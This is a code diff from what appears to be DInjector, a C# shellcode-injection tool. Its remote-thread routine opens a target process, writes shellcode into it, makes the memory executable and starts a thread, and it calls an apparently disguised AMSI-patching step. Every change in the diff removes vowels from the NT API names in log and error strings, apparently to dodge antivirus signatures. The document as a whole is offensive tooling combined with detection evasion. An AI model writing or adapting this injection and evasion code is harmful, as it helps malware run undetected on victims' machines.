@@ -23,9 +23,9 @@ namespace DInjector
                 ref ci);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(RemoteThread) [+] NtOpenProcess");
+                Console.WriteLine("(RemoteThread) [+] NtOpnPrcss");
             else
-                throw new Exception($"(RemoteThread) [-] NtOpenProcess: {ntstatus}");
+                throw new Exception($"(RemoteThread) [-] NtOpnPrcss: {ntstatus}");
 
             if (remoteAm51)
                 AM51.Patch(
@@ -49,9 +49,9 @@ namespace DInjector
                 DI.Data.Win32.WinNT.PAGE_READWRITE);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(RemoteThread) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
+                Console.WriteLine("(RemoteThread) [+] NtAllctVrtlMmry, PAGE_READWRITE");
             else
-                throw new Exception($"(RemoteThread) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
+                throw new Exception($"(RemoteThread) [-] NtAllctVrtlMmry, PAGE_READWRITE: {ntstatus}");
 
             #endregion
 
@@ -70,9 +70,9 @@ namespace DInjector
                 ref bytesWritten);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(RemoteThread) [+] NtWriteVirtualMemory, shellcode");
+                Console.WriteLine("(RemoteThread) [+] NtWrtVrtlMmry, shellcode");
             else
-                throw new Exception($"(RemoteThread) [-] NtWriteVirtualMemory, shellcode: {ntstatus}");
+                throw new Exception($"(RemoteThread) [-] NtWrtVrtlMmry, shellcode: {ntstatus}");
 
             Marshal.FreeHGlobal(buffer);
 
@@ -90,9 +90,9 @@ namespace DInjector
                 ref oldProtect);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(RemoteThread) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
+                Console.WriteLine("(RemoteThread) [+] NtPrtctVrtlMmry, PAGE_EXECUTE_READ");
             else
-                throw new Exception($"(RemoteThread) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
+                throw new Exception($"(RemoteThread) [-] NtPrtctVrtlMmry, PAGE_EXECUTE_READ: {ntstatus}");
 
             #endregion
 
@@ -114,9 +114,9 @@ namespace DInjector
                 IntPtr.Zero);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(RemoteThread) [+] NtCreateThreadEx");
+                Console.WriteLine("(RemoteThread) [+] NtCrtThrdEx");
             else
-                throw new Exception($"(RemoteThread) [-] NtCreateThreadEx: {ntstatus}");
+                throw new Exception($"(RemoteThread) [-] NtCrtThrdEx: {ntstatus}");
 
             #endregion
 
